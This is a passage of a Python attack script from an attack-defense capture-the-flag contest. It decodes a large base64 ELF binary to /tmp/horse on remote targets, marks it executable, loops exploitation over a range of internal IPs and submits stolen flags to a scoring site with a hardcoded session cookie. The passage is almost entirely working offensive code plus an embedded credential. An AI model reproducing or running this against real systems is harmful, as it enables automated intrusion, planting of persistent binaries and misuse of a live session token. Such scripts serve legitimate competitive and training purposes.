AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIBIAAAAAAADgEQAAAAAAAAEAAAAAAAAA4QAAAAAAAAABAAAAAAAAAPEAAAAAAAAADAAAAAAAAAAAEAAAAAAAAA0AAAAAAAAANBgAAAAAAAAZAAAAAAAAANg9AAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAA4D0AAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAACgAwAAAAAAAAUAAAAAAAAAEAYAAAAAAAAGAAAAAAAAANADAAAAAAAACgAAAAAAAAAgAQAAAAAAAAsAAAAAAAAAGAAAAAAAAAAVAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAAQAAAAAAAAAIAAAAAAAAAgAEAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAACgCAAAAAAAAAcAAAAAAAAAsAcAAAAAAAAIAAAAAAAAAPAAAAAAAAAACQAAAAAAAAAYAAAAAAAAAPv//28AAAAAAAAACAAAAAD+//9vAAAAAGAHAAAAAAAA////bwAAAAACAAAAAAAAAPD//28AAAAAMAcAAAAAAAD5//9vAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6D0AAAAAAAAAAAAAAAAAAAAAAAAAAAAANhAAAAAAAABGEAAAAAAAAFYQAAAAAAAAZhAAAAAAAAB2EAAAAAAAAIYQAAAAAAAAlhAAAAAAAACmEAAAAAAAALYQAAAAAAAAxhAAAAAAAADWEAAAAAAAAOYQAAAAAAAA9hAAAAAAAAAGEQAAAAAAABYRAAAAAAAAJhEAAAAAAAAAAAAAAAAAAKBAAAAAAAAAR0NDOiAoRGViaWFuIDkuMy4wLTE1KSA5LjMuMAAALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuZ251LnByb3BlcnR5AC5ub3RlLmdudS5idWlsZC1pZAAubm90ZS5BQkktdGFnAC5nbnUuaGFzaAAuZHluc3ltAC5keW5zdHIALmdudS52ZXJzaW9uAC5nbnUudmVyc2lvbl9yAC5yZWxhLmR5bgAucmVsYS5wbHQALmluaXQALnBsdC5nb3QALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuZHluYW1pYwAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAEAAAACAAAAAAAAABgDAAAAAAAAGAMAAAAAAAAcAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABMAAAAHAAAAAgAAAAAAAAA4AwAAAAAAADgDAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAmAAAABwAAAAIAAAAAAAAAWAMAAAAAAABYAwAAAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAOQAAAAcAAAACAAAAAAAAAHwDAAAAAAAAfAMAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEcAAAD2//9vAgAAAAAAAACgAwAAAAAAAKADAAAAAAAAMAAAAAAAAAAGAAAAAAAAAAgAAAAAAAAAAAAAAAAAAABRAAAACwAAAAIAAAAAAAAA0AMAAAAAAADQAwAAAAAAAEACAAAAAAAABwAAAAEAAAAIAAAAAAAAABgAAAAAAAAAWQAAAAMAAAACAAAAAAAAABAGAAAAAAAAEAYAAAAAAAAgAQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAGEAAAD///9vAgAAAAAAAAAwBwAAAAAAADAHAAAAAAAAMAAAAAAAAAAGAAAAAAAAAAIAAAAAAAAAAgAAAAAAAABuAAAA/v//bwIAAAAAAAAAYAcAAAAAAABgBwAAAAAAAFAAAAAAAAAABwAAAAIAAAAIAAAAAAAAAAAAAAAAAAAAfQAAAAQAAAACAAAAAAAAALAHAAAAAAAAsAcAAAAAAADwAAAAAAAAAAYAAAAAAAAACAAAAAAAAAAYAAAAAAAAAIcAAAAEAAAAQgAAAAAAAACgCAAAAAAAAKAIAAAAAAAAgAEAAAAAAAAGAAAAGAAAAAgAAAAAAAAAGAAAAAAAAACRAAAAAQAAAAYAAAAAAAAAABAAAAAAAAAAEAAAAAAAABcAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAjAAAAAEAAAAGAAAAAAAAACAQAAAAAAAAIBAAAAAAAAAQAQAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAJcAAAABAAAABgAAAAAAAAAwEQAAAAAAADARAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAACgAAAAAQAAAAYAAAAAAAAAQBEAAAAAAABAEQAAAAAAAPEGAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAApgAAAAEAAAAGAAAAAAAAADQYAAAAAAAANBgAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAKwAAAABAAAAAgAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAbQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAC0AAAAAQAAAAIAAAAAAAAAcCAAAAAAAABwIAAAAAAAAFwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAwgAAAAEAAAACAAAAAAAAANAgAAAAAAAA0CAAAAAAAACIAQAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAMwAAAAOAAAAAwAAAAAAAADYPQAAAAAAANgtAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADYAAAADwAAAAMAAAAAAAAA4D0AAAAAAADgLQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA5AAAAAYAAAADAAAAAAAAAOg9AAAAAAAA6C0AAAAAAADwAQAAAAAAAAcAAAAAAAAACAAAAAAAAAAQAAAAAAAAAJsAAAABAAAAAwAAAAAAAADYPwAAAAAAANgvAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADtAAAAAQAAAAMAAAAAAAAAAEAAAAAAAAAAMAAAAAAAAJgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA9gAAAAEAAAADAAAAAAAAAJhAAAAAAAAAmDAAAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAPwAAAAIAAAAAwAAAAAAAACwQAAAAAAAAKgwAAAAAAAAIAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAABAQAAAQAAADAAAAAAAAAAAAAAAAAAAACoMAAAAAAAAB0AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAxTAAAAAAAAAKAQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA== | base64 -d > /tmp/horse')
        r.sendline(b'chmod +x /tmp/horse')
        r.close()
        r = remote(ip, port , ssl=False)
        '''
        exploit, last step is /tmp/horse
        '''
        return r
    except:
        return 'down'
# proxies = {
#   "http": "http://127.0.0.1:8080",
#   "https": "http://127.0.0.1:8080",
# }

cookie = {'_zephyr_key': 'SFMyNTY.g3QAAAADbQAAAAtfY3NyZl90b2tlbm0AAAAYOHlxVmJNMGxtcm1oQzh0XzdWN05fcVpfbQAAAA5saXZlX3NvY2tldF9pZG0AAAA7dXNlcnNfc2Vzc2lvbnM6dlhuTVdzR3JDSVZDV1BWN1BsVkJOWUpiLUZSRy1nTFhJN3FpeG94NEgzUT1tAAAACnVzZXJfdG9rZW5tAAAAIL15zFrBqwiFQlj1ez5VQTWCW_hURvoC1yO6osaMeB90.wVAx3eHtvK4OuoCejCjfDSHQoaXV-HWeU8DywXH7SfA'}

def grep_csrf_token(txt):
    pattern = re.findall(r'_csrf_token\" type=\"hidden\" value=\"(.*?)\"', txt)
    return pattern[0]

def submit_flag(session, flag):
    print("flag:%s"%flag)
    time.sleep(1)
    r = session.get('https://zephyr.2022.nautilus.institute/redemptions', cookies=cookie)
    csrf_token = grep_csrf_token(r.text)
    payload = {'_csrf_token': csrf_token, "redemption[content]": flag}
    print(payload)
    r = session.post('https://zephyr.2022.nautilus.institute/redemptions', data=payload, cookies=cookie)
    return r


def normal_attack():
    session = requests.session()
    while True:
        down_cnt, patched_cnt = 0, 0
        for x in range(101,117):
            if x != 112:
                res = atk("10.13.40."+str(x), 57345) # please input the task's port
                if res == 'patched':
                    patched_cnt += 1
                if res == 'down':
                    down_cnt += 1
                else:
                    print(submit_flag(session, res))
        print('DOWN_cnt: %d  PATCHED_cnt: %d' % (down_cnt, patched_cnt))

# atk('10.13.40.106')
if __name__ == '__main__':
    normal_attack()
    # r = write_horse('127.0.0.1', 7777)
    # r.interactive()